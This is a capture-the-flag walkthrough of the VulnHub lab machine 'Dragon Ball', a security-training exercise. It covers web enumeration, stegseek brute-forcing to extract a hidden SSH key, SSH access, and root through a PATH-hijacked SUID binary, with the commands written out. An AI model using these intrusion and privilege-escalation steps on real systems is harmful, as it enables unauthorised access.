# Dragon Ball — VulnHub

**CTF:** VulnHub  
**Date:** 2025-10-07  
**Category:** misc  
**Difficulty:** Grade 3  

---

## Summary

Dr4g0n b4ll is a Dragon Ball-themed VulnHub machine that chains together web enumeration, base64 decoding, steganography on a hidden image, an SSH private key, and PATH hijacking to reach root.

---

## Reconnaissance

```bash
nmap -sC -sV -p- 192.168.19.143
```

Only **port 80** was open — straightforward HTTP-only machine.

---

## Enumeration

### Web — Source Code

Visiting the root page showed a Goku image. Checking the page source revealed a **base64-encoded comment**:

```bash
echo VWtaS1FsSXdPVTlKUlVwQ1ZFVjNQUT09 | base64 -d | base64 -d | base64 -d
```

This decoded to the string `DRAGON BALL` — a hint pointing toward a hidden directory.

### robots.txt

```
/DRAGON BALL/
```

Another base64 message was found here, instructing us to find a hidden directory. Navigating to `/DRAGON BALL/Vulnhub/` revealed a static login page and an image: `aj.jpg`.

---

## Exploitation — Steganography

Downloaded the image:

```bash
wget "http://192.168.19.143/DRAGON BALL/Vulnhub/aj.jpg"
```

Tried `steghide` without a passphrase — nothing. Brute-forced the passphrase using `stegseek` with `rockyou.txt`:

```bash
stegseek aj.jpg /usr/share/wordlists/rockyou.txt
```

This extracted a file: `aj.jpg.out` — containing an **SSH private key**.

---

## Initial Access

Identified the SSH user from the earlier enumeration, set permissions on the key, and connected:

```bash
chmod 600 id_rsa
ssh -i id_rsa USER@192.168.19.143
```

Got a shell on the target. Read the **user flag** from the home directory.

---

## Privilege Escalation

### SUID Binary — PATH Hijacking

Checked for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Found a custom binary. Ran `strings` on it to see what commands it called — it was calling `id` without an absolute path.

Created a malicious `id` in `/tmp`, added `/tmp` to `$PATH`, and ran the binary:

```bash
echo "/bin/bash" > /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
./vulnerable_binary
```

Got a root shell.

```bash
cat /root/proof.txt
```

---

## Flags

- **User flag** — found in the user's home directory post-SSH
- **Root flag** — `/root/proof.txt`
